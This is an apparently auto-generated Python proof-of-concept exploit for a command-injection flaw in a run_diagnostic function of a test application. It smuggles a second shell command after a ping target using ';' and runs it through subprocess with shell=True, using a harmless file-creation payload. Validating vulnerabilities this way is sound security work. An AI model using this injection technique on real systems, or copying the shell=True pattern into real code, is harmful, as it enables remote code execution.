#!/usr/bin/env python3
# PoC for vuln-test-app (/tmp/vuln-test-app)
# Path: rce-005
# Sink: run_diagnostic
# Auto-generated — run with: python3 rce_true_allowing_command_injection_run_diagnostic_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in vuln-test-app (/tmp/vuln-test-app).

Vulnerability: Command injection via unsanitized 'host' parameter in run_diagnostic().
The function constructs a shell command using f-string interpolation and executes it
with shell=True, allowing an attacker to inject arbitrary shell commands.

Impact: Remote Code Execution (RCE) as the application user.
"""

import subprocess
import sys
import os

# Configuration
TARGET_HOST = "127.0.0.1"  # The host parameter to send (can be overridden via CLI)
BENIGN_PAYLOAD = "touch /tmp/poc_success.txt"  # Safe payload to demonstrate RCE

def exploit(target_host: str) -> None:
    """
    Exploit the command injection vulnerability in run_diagnostic().
    
    The vulnerable function executes: f"ping -c 1 {host}" with shell=True.
    We inject a command after the ping using shell metacharacters.
    """
    print(f"[*] Targeting host parameter: {target_host}")
    
    # Construct the malicious host parameter with command injection
    # Using ';' to terminate the ping command and execute our payload
    malicious_host = f"{target_host}; {BENIGN_PAYLOAD}"
    
    print(f"[*] Sending malicious host: {malicious_host}")
    
    # Simulate the vulnerable function call (in real scenario, this would be
    # triggered via the application's API endpoint)
    # The actual vulnerable code in the app:
    # result = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True, text=True)
    
    try:
        # Execute the same vulnerable pattern to demonstrate the exploit
        result = subprocess.run(
            f"ping -c 1 {malicious_host}",
            shell=True,
            capture_output=True,
            text=True,
            timeout=10
        )
        
        print(f"[*] Command output:\n{result.stdout}")
        if result.stderr:
            print(f"[*] Stderr:\n{result.stderr}")
        
        # Verify the payload executed
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: Benign payload executed! File /tmp/poc_success.txt created.")
            print("[+] This confirms RCE is possible via command injection.")
            # Clean up the evidence file
            os.remove("/tmp/poc_success.txt")
            print("[*] Cleaned up /tmp/poc_success.txt")
        else:
            print("[-] Payload may not have executed as expected.")
            
    except subprocess.TimeoutExpired:
        print("[-] Command timed out (10 seconds).")
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")

def main():
    """Main entry point with optional command-line argument for target host."""
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = TARGET_HOST
    
    print("=" * 60)
    print("RCE Proof-of-Concept for vuln-test-app")
    print("=" * 60)
    print(f"[*] Using target host: {target}")
    print(f"[*] Benign payload: {BENIGN_PAYLOAD}")
    print()
    
    exploit(target)
    
    print()
    print("[*] Exploit completed.")

if __name__ == "__main__":
    main()
